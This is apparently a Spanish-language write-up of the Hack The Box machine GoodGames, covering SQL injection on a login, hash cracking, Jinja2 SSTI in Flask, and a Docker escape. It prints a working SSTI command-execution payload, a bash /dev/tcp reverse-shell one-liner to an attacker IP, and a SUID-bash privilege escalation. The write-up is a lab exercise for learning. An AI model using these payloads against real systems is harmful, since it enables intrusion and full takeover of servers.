
---
 - Tags: #SQLi #HTB #Easy #web #Hashcracking #SSTI #Docker #Flask #Burpsuite #Proxy 
--- 

#### QUÉ SE EXPLOTA:

GoodGames se compromete vía **[[SQLi]]** en el login para volcar hashes crackeables; la contraseña rota, por reutilización, da acceso a una consola vulnerable a **[[SSTI]]** que permite shell en [[Docker]]; desde ahí se aprovechan montajes/permisos débiles para **escapar del contenedor** y escalar a root.

#### Write UP
##### Primer Fase: ESCANEOS

El primer escaneo a la maquina lo realizamos con nmap. Como ya sabemos nmap nos ayudará a auditar una red y los puertos y servicios corriendo en una maquina. 

![[Pasted image 20251002162920.png]]

Vemos que únicamente hay un puerto 80 abierto, por lo que debe haber un servicio web corriendo. 
Lanzamos un segundo escaneo para analizar a mayor detalle. 
![[Pasted image 20251002163021.png]]
No encontramos nada de interés por lo que proseguimos a inspeccionar la pagina web corriendo en el puerto 80. 

**En la pagina web encontrada encontramos un panel de login donde posiblemente podamos explotar**

##### Segunda Fase: EXPLOTACIÓN

Para la explotación encontramos un panel de login donde intentamos una SQLi pero, el campo para ingresar email no permitía ciertos caracteres, por lo que una forma de evadirlo  es usando [[Burpsuite]].

![[Pasted image 20251004100613.png]]

A través del proxy interceptamos la petición POST con el email adecuado y lo modificamos para corroborar que hay una inyección SQL, y bueno, si la hay. Una vez habiendo hecho eso, podemos simplemente empezar con la enumeración. **también estaba la columna email**

![[Pasted image 20251004112237.png]]

Enumerando obtuvimos un hash que al verificar con [[hash-identifier]], 

![[Pasted image 20251004112759.png]]

una vez que obtuvimos la contraseña la crackeamos con [[John the ripper]]

'![[Pasted image 20251004114255.png]]'
Una vez obtenidas las contraseñas pudimos acceder al panel **también pudimos haber accedido con ' or 1=1'** pero de esta manera ya obtuvimos posibles contraseñas y usuarios. 

![[Pasted image 20251004114523.png]]

Dentro de la sesión de Admin encontramos un boton que nos redirige a un dominio el cual no carga ya que tenemos que asociar la IP con el dominio ya que seguramente se emplea virtual hosting.

![[Pasted image 20251004114810.png]]

modificamos el **/etc/hosts/** añadiendo la ip y el dominio/s...

![[Pasted image 20251004115654.png]]
![[Pasted image 20251004115712.png]]

probamos las credenciales que ya tenemos.

![[Pasted image 20251004115830.png]]

Las credenciales son validas por lo que ahora tenemos accesso a [[Flask]].

Una vez dentro de Flask intentaremos con una STTI como sabemos flask se apoya en jinja2 cómo motor de plantillas por lo que podemos intentar con algún payload [[SSTI]] para ver si responde. En este caso ocupamos uno de Jinja2

![[Pasted image 20251004120954.png]]

Se está ejecutando la operación por tanto es vulnerable a [[SSTI]]

![[Pasted image 20251004121024.png]]

Buscamos algún payload malicioso dentro de  [payloadallthethings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md#jinja2---remote-command-execution) 

```bash
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

![[Pasted image 20251004121440.png]]

**tenemos ejecución remota**

Ahora proseguimos a entablarnos una Revshell con el oneliner...
```bash
bash -c 'bash -i >& /dev/tcp/10.10.16.6/443 0>&1'
```

![[Pasted image 20251004121752.png]]

Nos ponemos en escucha y...

![[Pasted image 20251004121818.png]]
ganamos acceso y estabilizamos la shell

Desde que ganamos accesso ya etamos como root, por lo que checamos la IP y parece ser un contenedor de docker:
![[Pasted image 20251004123118.png]]
sin embargo, al checar grupos y /etc/passwd/ (teniamos acceso como root) verificamos que único usurio disponible era root, esto lo sabemos ya que es el único que contaba con una bash y además no había grupo 1000 **el GID 1000 suele corresponder a usuarios**
![[Pasted image 20251004122143.png]]

Sin embargo, al listar los /home había una ruta con GID 1000.
![[Pasted image 20251004122505.png]]

Si no hay usuarios más que root ese home debe estar montado de algún lugar. 
Para buscar monturas y filtrar por homeusamos 
```bash
mount | grep "home"
```

![[Pasted image 20251004122706.png]]
Vemos que el /home/augustus está montado. Ahora proseguimos a verificar puertos y checar si hay el /home/augustus está corriendo desde algún lugar.  

El contenedor está en la ip **172.19.0.2** por lo que tiene que tener un gateway (es decir la maquina que sirve como conexión entre el contenedor y el host) y además el contenedor al estar corriendo significa que la maquina también. 

Checamos las rutas activas...
```bash
route -n
```
![[Pasted image 20251004125346.png]]

Para las rutas dentro de la red 172.19.0.0 no necesita gateway, sin embargo, para cualquier destino fuera de esa red necesita pasar por el gateway 172.19.0.1
Probablemente sea la maquina de Augustus, sin embargo, tenemos que verificar los puertos abiertos para esta maquina. 

Al ser una maquina interna, y no tenemos nmap, creamos nuestro propio escaner de puertos, recordemos que tampoco tenemos vim, nano, vi, etc... solo tendremos que crearlo desde nuestra propia maquina/terminal.

creamos un scanner de puertos como el TCP bash en [[Scanner Puertos]]

Creamos un servidor con python3 
```bash
sudo python3 -m http.server 80
```
Con **wget** nos descargamos el archivo en el directorio **/tmp** le damos permisos y le damos

![[Pasted image 20251004135621.png]]

Podemos intentar conecatarnos a través de ssh...

```bash
ssh augustus@172.9.0.1
```

nosotros al ser la 172.9.0.2 nos tenemos que conectar al gateway en este caso 172.9.0.1 y el gateway al ser el server nos conectamos directamente a Augustus a través de [[Docker]].

![[Pasted image 20251004135808.png]]
![[Pasted image 20251004140037.png]]

##### Tercera Fase: POST EXPLOTACIÓN - PRIVESC

Una vez siendo agustus podemos escalar privilegios de manera muy sencilla pero, ingeniosa. Recordemos que en el contenedor es decir a donde llegamos una vez que habíamos explotado [[Flask]] llegamos con privilegios de root... por ende, lo que prodiamos hacer es.. 

copiarnos **/bin/bash** en el desktop de augustus. **Recordemos que el directorio home estaba montado en el contenedor** por lo que si copiamos /bin/bash y nos lo pegamos en el home de augustus, nos vamos al contenedor donde somos root y le damos privilegios SUID, por tanto se mostrará en el el home de augustus con todo los privilegios por lo que simplemente podemos ejecutar 

```bash
bash -p
```

![[Pasted image 20251004141606.png]]
![[Pasted image 20251004141715.png]]
-**nota es 4755 no 7755**


**LISTO**
![[Pasted image 20251004142339.png]]


base64 -w 0 archivo.sh

